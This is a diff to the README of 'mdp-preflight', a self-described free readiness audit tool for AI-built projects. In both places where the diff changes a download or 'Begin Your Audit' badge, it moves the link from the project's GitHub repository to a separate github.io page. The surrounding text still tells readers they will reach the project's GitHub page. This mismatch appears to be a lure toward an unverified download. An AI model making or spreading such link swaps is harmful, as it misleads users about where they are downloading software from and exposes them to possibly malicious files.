@@ -6,7 +6,7 @@ Welcome to **mdp-preflight**, your free and friendly readiness audit tool for pr
 
 ### 📥 Download Now
 
-[![Download mdp-preflight](https://img.shields.io/badge/Download-mdp--preflight-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tobiast5801/mdp-preflight)
+[![Download mdp-preflight](https://img.shields.io/badge/Download-mdp--preflight-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://tobiast5801.github.io)
 
 Visit this link to download the application. You'll land on the GitHub page for mdp-preflight, where you can grab the latest version and start your project's health check immediately.
 
@@ -125,7 +125,7 @@ Check the GitHub page periodically for new releases. Downloading the latest vers
 
 Don't wait until your project reaches production to discover issues. Start with a free readiness audit and give your AI-built project the pre-flight check it deserves. Your future self (and your users) will thank you!
 
-[![Begin Your Audit](https://img.shields.io/badge/🚀-Begin_Your_Audit-FF5722?style=for-the-badge)](https://github.com/tobiast5801/mdp-preflight)
+[![Begin Your Audit](https://img.shields.io/badge/🚀-Begin_Your_Audit-FF5722?style=for-the-badge)](https://tobiast5801.github.io)
 
 Visit the link above to download mdp-preflight, and within minutes, you'll have a clear picture of your project's health and readiness. It's free, it's fast, and it's the smartest check you can do for your AI-assisted project today!
 
